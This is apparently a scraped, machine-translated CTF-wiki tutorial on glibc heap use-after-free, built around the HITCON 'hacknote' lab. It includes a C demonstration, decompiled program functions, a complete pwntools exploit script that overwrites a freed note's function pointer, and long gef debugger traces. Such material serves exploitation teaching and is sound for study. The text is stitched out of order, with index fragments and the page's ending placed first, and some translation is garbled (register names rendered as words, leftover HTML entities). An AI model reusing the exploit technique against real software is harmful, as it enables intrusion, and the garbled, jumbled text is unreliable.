\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b008 \u2192 0x0804865b \u2192 push ebp \u2190 $esp When the delete is over, let&#39;s take a look at the bins and we can see that it is actually stored in the corresponding fast bin. ```c++ gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 After we have deleted all the note1, watch bins again. It can be seen that the chunk block deleted later is indeed in the header. ` asm gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b040, size=0x10) \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b050, size=0x28) \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 Then, at this time, we will apply for note2, we can see what memory block is applied to note2, as follows **The memory block corresponding to note2 is 0x804b040, which is actually the memory address corresponding to note1. ** `` `asm [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 0x080486cf in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $ebx : 0x00000000 $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x080486cf \u2192 <add_note+89> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf <add_note+89> add esp, 0x10 The memory address of the content of the note2 is 0x804b008, which is the address corresponding to note0. That is, when we write the content to the content of note2, the put field of note0 will be overwritten. ` asm gef\u27a4 n 1 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 0x08048761 in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x0804b040 \u2192 0x0804865b \u2192 push ebp $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x08048761 \u2192 add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 add esp, 0x10 Let&#39;s examine it in detail. Looking at the situation before the overlay, we can see that the put pointer of the memory block has been set to NULL, which is determined by the free mechanism of fastbin. `` `asm gef\u27a4 x/2xw 0x804b008 0x804b008: 0x00000000 0x0804b018 After coverage, the specific values are as follows ` asm gef\u27a4 x/2xw 0x804b008 0x804b008: 0x08048986 0x0804b00a gef\u27a4 x/i 0x08048986 0x8048986 : push ebp It can be seen that it has indeed been covered as the magic function we want. The final execution is as follows ```shell [+] Starting local process './hacknote': pid 35030 [*] Switching to interactive mode flag{use_after_free}---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- At the same time, we can also use gef's heap-analysis-helper to see the application and release of the whole heap, as follows ` asm gef\u27a4 heap-analysis-helper [*] This feature is under development, expect bugs and unstability... [+] Tracking malloc() [+] Tracking free() [+] Tracking realloc() [+] Disabling hardware watchpoints (this may increase the latency) [+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found. [*] Note: The heap analysis slows down noticeably the execution. gef\u27a4 c Continuing. [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(32)=0x804b018 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(32)=0x804b050 [+] Heap-Analysis - free(0x804b018) [+] Heap-Analysis - watching 0x804b018 [+] Heap-Analysis - free(0x804b008) [+] Heap-Analysis - watching 0x804b008 [+] Heap-Analysis - free(0x804b050) [+] Heap-Analysis - watching 0x804b050 [+] Heap-Analysis - free(0x804b040) [+] Heap-Analysis - watching 0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - Cleaning up [+] Heap-Analysis - Re-enabling hardware watchpoints [New process 36248] process 36248 is executing new program: /bin/dash [New process 36249] process 36249 is executing new program: /bin/cat [Inferior 3 (process 36249) exited normally] ``` The first output here is twice, it should be a problem with the gef tool. topic \u00b6 2016 HCTF mount","title":"Use After Free"},{"location":"pwn/linux/glibc-heap/use_after_free/#use-after-free","text":"","title":"Use After Free"},{"location":"pwn/linux/glibc-heap/use_after_free/#principle","text":"Simply put, Use After Free is what it literally means, and is used again when a block of memory is released. But in fact, here are the following situations After the memory block is released, its corresponding pointer is set to NULL, and then used again, the natural program will crash. After the memory block is released, its corresponding pointer is not set to NULL, and then there is no code to modify the memory block before it is used next time, then the program is likely to work properly**. After the memory block is released, its corresponding pointer is not set to NULL, but before it is used next time, there is code to modify the memory, then when the program uses the memory again, is very There may be strange problems . The Use After Free vulnerability we generally refer to is mainly the latter two. In addition, we generally say that the memory pointer that was not set to NULL after being released is the dangling pointer. Here is a simple example #include <stdio.h> #include <stdlib.h> typedef struct name { char * myname ; void ( * func )( char * str ); } NAME ; void myprint ( char * str ) { printf ( \"%s \\n \" , str ); } void printmyname () { printf ( \"call print my name \\n \" ); } int main () { NAME * a ; a = ( NAME * ) malloc ( sizeof ( struct name )); a -> func = myprint ; a -> myname = \"I can also use it\" ; a -> func ( \"this is my function\" ); // free without modify free ( a ); a -> func ( \"I can also use it\" ); // free with modify a -> func = printmyname ; a -> func ( \"this is my function\" ); // set NULL a = NULL ; printf ( \"this pogram will crash... \\n \" ); a -> func ( \"can not be printed...\" ); } The results are as follows \u279c use_after_free git: ( use_after_free ) \u2717 ./use_after_free this is my function I can also use it call print my name this pogram will crash... [ 1 ] 38738 segmentation fault ( core dumped ) ./use_after_free","title":"Principle"},{"location":"pwn/linux/glibc-heap/use_after_free/#example","text":"Here we take [lab 10 hacknote] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote ) in HITCON-training as an example.","title":"example"},{"location":"pwn/linux/glibc-heap/use_after_free/#functional-analysis","text":"We can simply analyze the program, we can see that there is a menu function at the beginning of the program, which has puts ( \" 1. Add note \" ); puts ( \" 2. Delete note \" ); puts ( \" 3. Print note \" ); puts ( \" 4. Exit \" ); Therefore, the program should have three main functions. The program then performs the appropriate function based on the user's input.","title":"Functional Analysis"},{"location":"pwn/linux/glibc-heap/use_after_free/#add_note","text":"According to the program, we can see that the program can add up to 5 notes. Each note has two fields, put and content, where put is set to a function whose function outputs content specific content. unsigned int add_note () { note * v0 ; // ebx signed int i ; // [esp+Ch] [ebp-1Ch] int size ; // [esp+10h] [ebp-18h] char buf ; // [esp+14h] [ebp-14h] unsigned int v5 ; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword ( 0x14u ); if ( count <= 5 ) { for ( i = 0 ; i <= 4 ; ++ i ) { if ( ! notelist [ i ] ) { notelist [ i ] = malloc ( 8u ); if ( ! notelist [ i ] ) { puts ( \"Alloca Error\" ); exit ( -1 ); } notelist [ i ] -> put = print_note_content ; printf ( \"Note size :\" ); read ( 0 , & buf , 8u ); size = atoi ( & buf ); v0 = notelist [ i ]; v0 -> content = malloc ( size ); if ( ! notelist [ i ] -> content ) { puts ( \"Alloca Error\" ); exit ( -1 ); } printf ( \"Content :\" ); read ( 0 , notelist [ i ] -> content , size ); puts ( \"Success !\" ); ++ count ; return __readgsdword ( 0x14u ) ^ v5 ; } } } else { puts ( \"Full\" ); } return __readgsdword ( 0x14u ) ^ v5 ; }","title":"add_note"},{"location":"pwn/linux/glibc-heap/use_after_free/#print_note","text":"Print_note simply outputs the contents of the note corresponding to the index based on the index of the given note. unsigned int print_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & amp ; buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) notelist [ v1 ] -> put ( notelist [ v1 ]); return __readgsdword ( 0x14u ) ^ v3 ; }","title":"print_note"},{"location":"pwn/linux/glibc-heap/use_after_free/#delete_note","text":"Delete_note will release the corresponding note based on the given index. However, it is worth noting that when deleting, it is simply free, but not set to NULL, then obviously, there is the case of Use After Free. unsigned int del_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & amp ; buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) { free ( notelist [ v1 ] -> content ); free ( notelist [ v1 ]); puts ( \"Success\" ); } return __readgsdword ( 0x14u ) ^ v3 ; }","title":"delete_note"},{"location":"pwn/linux/glibc-heap/use_after_free/#utilization-analysis","text":"We can see that Use After Free may indeed happen, so how can we make it happen and use it? It is also important to note that there is also a magic function in this program. Is it possible to make the program execute the magic function by using after after? A very straightforward idea is to modify the put field of the note to the address of the magic function, thus implementing the magic function when executing the print note. So how do you do this? We can simply look at the specific process of each note generation. The program applies 8-byte memory to store the put and content pointers in the note. The program requests a memory of the specified size based on the size entered, and then stores the content. +-----------------+ | put | +-----------------+ | content | size +-----------------+------------------->+----------------+ | real | | content | | | +----------------+ So, according to what we learned in the heap implementation, it is clear that the note is a fastbin chunk (16 bytes in size). Our goal is to have the put field of a note as the function address of magic, then we have to find a way to make the put pointer of a note overwritten as a magic address. Since there is only one place in the program to assign a put. So we have to use the time to write real content to cover. The specific ideas adopted are as follows Apply note0, real content size is 16 (the size is different from the bin where the note size is located) Apply note1, real content size is 16 (the size is different from the bin where the note size is located) Release note0 Release note1 At this point, the fast bin chunk size of 16 is note1->note0 Apply note2 and set the size of real content to 8, then according to the heap allocation rules note2 will actually allocate the memory block corresponding to note1. real content The corresponding chunk is actually note0. If we write the magic address to the chunk part of the note2 real content at this time, then since we don't have note0 NULL. When we try to output note0 again, the program will call the magic function.","title":"Utilization Analysis"},{"location":"pwn/linux/glibc-heap/use_after_free/#using-scripts","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './hacknote' ) def addnote ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def delnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def printnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) #gdb.attach(r) magic = 0x08048986 addnote ( 32 , \"aaaa\" ) # add note 0 addnote ( 32 , & quot ; daa & quot ;) # add note 1 delnote ( 0 ) # delete note 0 delnote ( 1 ) # delete note 1 addnote ( 8 , p32 ( magic )) # add note 2 printnote ( 0 ) # print note 0 r . interactive () We can look at the execution process specifically, first break down the breakpoint Two malloc breakpoints gef\u27a4 b *0x0804875C Breakpoint 1 at 0x804875c gef\u27a4 b *0x080486CA Breakpoint 2 at 0x80486ca Two free breakpoints gef\u27a4 b *0x08048893 Breakpoint 3 at 0x8048893 gef\u27a4 b *0x080488A9 Breakpoint 4 at 0x80488a9 Then continue to execute the program, you can see that when you apply for note0, the requested memory block address is 0x0804b008. (eax storage function return value) ` asm $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x00000000 $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x080486cf \u2192 add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf add esp, 0x10 0x80486d2 <add_note+92> mov edx, eax 0x80486d4 <add_note+94> mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 <add_note+97> mov DWORD PTR [eax*4+0x804a070], edx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000008 \u2190 $esp 0xffffcf14\u2502+0x04: 0x00000000 0xffffcf18\u2502+0x08: 0xf7e29ef5 \u2192 add eax, 0x18210b 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type to continue, or q to quit--- [#0] 0x80486cf \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b008 UsedChunk(addr=0x804b008, size=0x10) Chunk size: 16 (0x10) Usable size: 12 (0xc) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off **The address of the content of the application note 0 is 0x0804b018** `` `asm $eax : 0x0804b018 \u2192 0x00000000 $ebx : 0x0804b008 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b018 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000020 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x08048761 \u2192 <add_note+235> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 <add_note+235> add esp, 0x10 0x8048764 <add_note+238> mov DWORD PTR [ebx+0x4], eax 0x8048767 <add_note+241> mov eax, DWORD PTR [ebp-0x1c] 0x804876a <add_note+244> mov eax, DWORD PTR [eax*4+0x804a070] 